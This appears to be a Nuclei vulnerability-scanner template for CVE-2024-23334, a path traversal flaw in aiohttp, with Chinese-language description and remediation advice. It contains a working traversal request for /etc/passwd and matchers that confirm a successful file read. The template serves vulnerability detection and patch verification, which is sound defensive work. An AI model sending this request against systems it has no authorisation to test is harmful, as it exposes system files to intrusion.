id: CVE-2024-23334
info:
  name: aiohttp路径遍历漏洞
  author: k3ppf0r
  severity: high
  description: |
    开发者在使用aiohttp实现Web服务的静态资源解析功能时，使用了不安全的参数“follow_symlinks“，这将导致服务存在目录遍历漏洞，攻击者可以利用此漏洞访问系统上的任意文件。
  reference:
    - https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-23334.yaml
  remediation: |
    1. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。
    【备注】：建议您在升级前做好数据备份工作，避免出现意外。
    https://github.com/aio-libs/aiohttp/releases/tag/v3.9.2
    2. 临时缓解方案：
      建议使用反向代理服务器（例如nginx）处理静态资源。
      如果静态资源解析功能中配置了“follow_symlinks=True”，建议立即修改该配置为False。
      建议使用安全防护类设备进行防护，拦截../../等路径穿越字符。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-23334
    cwe-id: CWE-22
    cpe: cpe:2.3:a:aiohttp:aiohttp:*:*:*:*:*:*:*:*, cpe:2.3:o:fedoraproject:fedora:39:*:*:*:*:*:*:*
  metadata:
    date: 2024-01-29
    version: |
      1.0.5 <= aiohttp < 3.9.2
  tags: cve,cve2024,aiohttp,leak

http:
  - method: GET
    path:
      - "{{BaseURL}}/static/../../../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "aiohttp"

      - type: status
        status:
          - 200
